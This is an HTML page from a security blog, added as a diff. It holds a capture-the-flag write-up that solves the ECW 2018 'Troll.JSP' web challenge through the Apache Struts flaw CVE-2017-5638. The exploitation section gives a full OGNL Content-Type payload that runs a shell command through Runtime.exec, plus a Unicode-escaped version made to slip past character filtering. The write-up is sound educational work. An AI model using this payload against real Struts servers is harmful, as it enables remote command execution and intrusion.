@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <title> Write Up : ECW 2018 - Troll.JSP &middot; 0xUKN - (in)Security Blog </title>
+
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.69.2" />
+
+
+<script src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://0xukn.fr/css/nix.css">
+
+
+
+<link rel="shortcut icon" href="/favicon.jpg">
+
+
+
+<link href="https://fonts.googleapis.com/css?family=Inconsolata%7COpen+Sans%7CConcert+One" rel="stylesheet">
+
+
+
+
+    </head>
+
+    <body>
+        <header>
+<nav class="navbar navbar-default navbar-fixed-top navbar-inverse font-header">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			<a class="navbar-brand" id="green-terminal" href=https://0xukn.fr>0xUKN@localhost ~ $</a>
+		</div>
+
+		
+		<div class="collapse navbar-collapse" id="navbar-collapse-1">
+			<ul class="nav navbar-nav navbar-right">
+				
+				
+				<li class="dropdown">
+                    
+            		<a id="green-terminal" href="/">about</a>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+            		<a id="green-terminal" href="/posts">posts</a>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+            		<a id="green-terminal" href="/projects">projects</a>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+            		<a id="green-terminal" href="/tags">tags</a>
+            		
+        		</li>
+        		
+
+			</ul>
+		</div>
+	</div>
+</nav>
+</header>
+
+        <div class="container wrapper">
+            <h1><a href="https://0xukn.fr/posts/writeupecw2018trolljsp/">Write Up : ECW 2018 - Troll.JSP</a></h1>
+	
+		<br><br>
+		<div id="tags">
+			<h4 style="display:inline">Tags :</h4>
+			
+				
+				<a href="/tags/web">web</a>
+			
+				 - 
+				<a href="/tags/cve-2017-5638">CVE-2017-5638</a>
+			
+				 - 
+				<a href="/tags/apache-struts">Apache Struts</a>
+			
+		</div>
+	
+            <span class="post-date">2018-11-02 </span>
+            <div class="post-content">
+                <p><em><strong>This post spoils a CTF challenge &hellip; Don&rsquo;t read if you want to try it !</strong></em></p>
+<p>ECW (European Cyber Week) is a Jeopardy student CTF challenge. It is organized by Thales, Airbus and the Bretagne region. I had a great time solving these challenges, despite a little abusive guessing in stegano challenges. Hurry to hand over this !</p>
+<p>Troll.JSP is a Web challenge based on CVE-2017-5638. Several hints were present in hashes to guide us but I totally missed them, so I had to guess some parts and bypass some filters. You can check <a href="https://haax.fr/en/writeups/ecw-2018/web-troll-jsp/">Haax&rsquo;s write-up</a> or <a href="http://maki.bzh/courses/blog/writeups/qualecw2018/">maki&rsquo;s write-up</a> to see different solutions.</p>
+<h2 id="-recon"><em>[+]</em> Recon</h2>
+<p>We are facing a simple website :
+<figure style="text-align: center;" >
+    
+        <img src="/resources/ecw_trolljsp/home_page.png"  />
+    
+    
+</figure>
+</p>
+<p>No information at first sight&hellip; but HTML comments are our friends.
+<figure style="text-align: center;" >
+    
+        <img src="/resources/ecw_trolljsp/hint_page.png"  />
+    
+    
+</figure>
+</p>
+<p>Let&rsquo;s request this non-indexed page :
+<figure style="text-align: center;" >
+    
+        <img src="/resources/ecw_trolljsp/debug_page.png"  />
+    
+    
+</figure>
+</p>
+<p>Hum, this is not really verbose. But at least, we know something : if we can inject something in #session variable, we will be able to see the output on this page.<br>
+A flag page is available, let&rsquo;s request it too.
+<figure style="text-align: center;" >
+    
+        <img src="/resources/ecw_trolljsp/flag_page.png"  />
+    
+    
+</figure>
+</p>
+<p>Obviously, this is a troll flag. But this hash is a known one, and it contains an hint about one way to solve the challenge. I totally missed the hint, but you can check <a href="https://haax.fr/en/writeups/ecw-2018/web-troll-jsp/">Haax&rsquo;s write-up</a> to see a solution which use it.<br>
+After trying a few pages, I noticed an error message on some requests, indicating that the web server is using Apache Struts and Apache Tomcat. I started testing all known Tomcat and Struts vulnerabilities.<br>
+Some tries later, I noticed that the Content-Type header was filtered against dots, parenthesis etc&hellip; (returns blank page). This uncommon behavior reminded me the CVE-2017-5638 in Apache Struts, which is precisely an exploit based on Content-Type header.</p>
+<h2 id="-exploitation"><em>[+]</em> Exploitation</h2>
+<p>I first tried to confirm that the vulnerability was working. Let&rsquo;s input a simple payload which is not filtered in the Content-Type header and request debug.jsp page.</p>
+<figure style="text-align: center;" >
+    
+        <img src="/resources/ecw_trolljsp/exploit1_page.png"  />
+    
+    
+    <figcaption>
+        <h5>Content-Type: ${#_=&#39;multipart/form-data&#39;,#session[&#39;cmd&#39;] = &#39;test&#39;}</h5>
+        
+    </figcaption>
+    
+</figure>
+
+<p>Nice !<br>
+But many characters are filtered, so we can&rsquo;t use common payloads&hellip; There are several solutions to bypass this : the most clever solution I saw is <a href="http://maki.bzh/courses/blog/writeups/qualecw2018/">maki&rsquo;s one</a>, which exploit a CVE-2017-5638 variant where the payload is located in the Content-Disposition header so it bypasses the Content-Type filtering in place here.<br>
+I found that another simple way to bypass the filtering was to use UTF encoding with \uXXXX.<br>
+Final payload is :<br>
+<blockquote>%{#x=&#39;multipart/form-data&#39;,#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#container=#context\[&#39;com.opensymphony.xwork2.ActionContext.container&#39;],#proc=@java.lang.Runtime@getRuntime().exec(&#39;cat /opt/tomcat/webapps/ECW/flag.jsp&#39;).getInputStream(),#z=@org.apache.commons.io.IOUtils@toString(#proc),#session\[&#39;cmd&#39;]=#z}</blockquote>
+</p>
+<p>After encoding :<br>
+<blockquote>%{#x=&#39;multipart/form-data&#39;,\u0023\u005f\u006d\u0065\u006d\u0062\u0065\u0072\u0041\u0063\u0063\u0065\u0073\u0073\u003d\u0040\u006f\u0067\u006e\u006c\u002e\u004f\u0067\u006e\u006c\u0043\u006f\u006e\u0074\u0065\u0078\u0074\u0040\u0044\u0045\u0046\u0041\u0055\u004c\u0054\u005f\u004d\u0045\u004d\u0042\u0045\u0052\u005f\u0041\u0043\u0043\u0045\u0053\u0053,\u0023\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0065\u0072\u003d\u0023\u0063\u006f\u006e\u0074\u0065\u0078\u0074\u005b\u0027\u0063\u006f\u006d\u002e\u006f\u0070\u0065\u006e\u0073\u0079\u006d\u0070\u0068\u006f\u006e\u0079\u002e\u0078\u0077\u006f\u0072\u006b\u0032\u002e\u0041\u0063\u0074\u0069\u006f\u006e\u0043\u006f\u006e\u0074\u0065\u0078\u0074\u002e\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0065\u0072\u0027\u005d,#proc=\u0040\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0040\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u002e\u0065\u0078\u0065\u0063\u0028\u0027cat /opt/tomcat/webapps/ECW/flag\u002ejsp\u0027\u0029\u002e\u0067\u0065\u0074\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029,#z=\u0040\u006f\u0072\u0067\u002e\u0061\u0070\u0061\u0063\u0068\u0065\u002e\u0063\u006f\u006d\u006d\u006f\u006e\u0073\u002e\u0069\u006f\u002e\u0049\u004f\u0055\u0074\u0069\u006c\u0073\u0040\u0074\u006f\u0053\u0074\u0072\u0069\u006e\u0067\u0028\u0023\u0070\u0072\u006f\u0063\u0029,#session\[&#39;cmd&#39;]=#z}</blockquote>
+</p>
+<p>The flag is hardcoded in flag.jsp source, so we can retrieve it with <code>cat /opt/tomcat/webapps/ECW/flag.jsp</code></p>
+<h2 id="-bye"><em>[+]</em> Bye</h2>
+<p>Thanks to <a href="https://haax.fr/">Haax</a> for the screenshots ! I totally forgot to take some during the CTF :(<br>
+<strong>Feel free to tell me what you think about this post :)</strong></p>
+
+            </div>
+            
+            
+            <div class="push"></div>
+        </div>
+        <footer class="footer text-center">
+<p>2020 - 0xUKN -
+<span class="credit">
+	Powered by
+	<a target="_blank" href="https://gohugo.io">Hugo</a>
+	and based on
+	<a target="_blank" href="https://github.com/LordMathis/hugo-theme-nix/">Nix</a> theme.
+</span>
+</p>
+</footer>
+
+    </body>
